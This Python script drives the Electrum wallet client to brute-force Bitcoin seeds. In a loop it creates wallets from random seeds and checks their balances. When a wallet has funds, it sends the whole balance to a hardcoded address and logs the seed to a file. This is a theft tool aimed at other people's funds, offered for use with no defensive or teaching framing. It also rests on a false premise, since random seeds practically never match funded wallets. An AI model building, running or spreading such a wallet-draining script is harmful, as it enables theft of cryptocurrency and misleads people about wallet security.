'''
@author Mqtth3w https://github.com/mqtth3w
@license GPL-3.0
'''

import subprocess
import sys
import platform
import json
import re
import os
#from electrum_seed import *

def run(cmd: list) -> str:
    """Run a command in terminal"""
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print(result.stderr)
        sys.exit(1)
    return result.stdout.strip()

def parse_json(output: str) -> dict:
    """Parse Electrum output to Json"""
    if not output:
        return {}
    start = output.find("{")
    if start == -1:
        return {}
    try:
        return json.loads(output[start:])
    except json.JSONDecodeError:
        return {}

def electrum(info: str, wallet_path: str, args: list) -> dict:
    """Run a electrum command for a specified wallet"""
    print(info)
    result = run([
            "electrum",
            "-w",
            wallet_path
        ] + args)
    return parse_json(result)

def get_latest_wallet_number(folder_path: str) -> int:
    """Get the highest wallet number"""
    wallet_numbers = []
    for name in os.listdir(folder_path):
        full_path = os.path.join(folder_path, name)
        if os.path.isfile(full_path):
            match = re.fullmatch(r"wallet_(\d+)", name)
            if match:
                wallet_numbers.append(int(match.group(1)))
    if not wallet_numbers:
        return 1
    return max(wallet_numbers) + 1

def print_balance(cbtc: float, ubtc: float):
    """Print BTC balance, colored if greater than zero"""
    green = "\033[92m"
    red = "\033[91m"
    reset = "\033[0m"
    if cbtc + ubtc > 0:
        print(f"{green}Confirmed BTC: {cbtc}{reset}")
        print(f"{red}Unconfirmed BTC: {ubtc}{reset}")
    else:
        print(f"Confirmed BTC: {cbtc}")
        print(f"Unconfirmed BTC: {ubtc}")

def main():
    stopped = False
    try:
        print("Starting electrum...")
        run([
                "electrum",
                "daemon",
                "-d"
            ])
        system = platform.system()
        base_wallet_path = ""
        if system == "Linux" or system == "Darwin":
            base_wallet_path = os.path.expanduser(f"~/.electrum/wallets")
        elif system == "Windows":
            base_wallet_path = os.path.expanduser(f"~/AppData/Roaming/Electrum/wallets")
        else:
            raise RuntimeError(f"Unsupported OS: {system}")
        latest_wallet_index = get_latest_wallet_number(base_wallet_path)
        for i in range(latest_wallet_index, 1000000):
            wallet = f"{base_wallet_path}/wallet_{i}"
            #seed = generate_electrum_seed("segwit")
            #electrum(f"Creating wallet at: {wallet}", wallet, ["restore", seed])
            seed = electrum(f"\n\nCreating wallet at: {wallet}", wallet, ["create"])["seed"]
            print(f"Wallet created from seed...\n{seed}")
            electrum("Loading wallet...", wallet, ["load_wallet"])
            balance = electrum("Getting balance...", wallet, ["getbalance"])
            confirmed = int(balance["confirmed"]) / 1e8
            unconfirmed = int(balance.get("unconfirmed", 0)) / 1e8
            print_balance(confirmed, unconfirmed)
            if confirmed + unconfirmed > 0:
                electrum("Sending coins...", wallet, ["payto", "bc1q943hmgcg28rxdvzc0yt69e829ug83htnue6pu7", "!"])
                with open("./relevant_seeds.txt", "a", encoding="utf-8") as f:
                    f.write(f"\n\n{wallet}\n{seed}\nTotal balance BTC: {confirmed + unconfirmed}")
    except KeyboardInterrupt:  
        stopped = True
    finally:
        print(f"{'Finished' if not stopped else 'Interrupt'}, stopping electrum...")
        run([
                "electrum",
                "stop"
            ])

if __name__ == "__main__":
    main()
